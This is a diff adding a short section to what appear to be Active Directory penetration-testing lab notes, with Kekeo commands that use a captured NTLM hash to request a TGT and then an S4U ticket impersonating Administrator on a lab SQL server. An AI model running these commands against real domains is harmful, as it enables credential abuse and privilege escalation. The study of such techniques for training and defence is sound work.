@@ -339,8 +339,19 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 ![](https://i.imgur.com/c767LzL.png)
 
 
+## **Abusing with Kekeo**
 
-
+• Either plaintext password or NTLM hash/AES keys is required. We already have
+access to websvc's hash from dcorp-adminsrv
+• Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
+kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local
+/rc4:cc098f204c5887eaa8253e7c2749156f
+• Using s4u from Kekeo, we request a TGS (steps 4 & 5):
+tgs::s4u
+/tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyco
+rp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
+/user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-
+mssql.dollarcorp.moneycorp.LOCAL
 
 
 
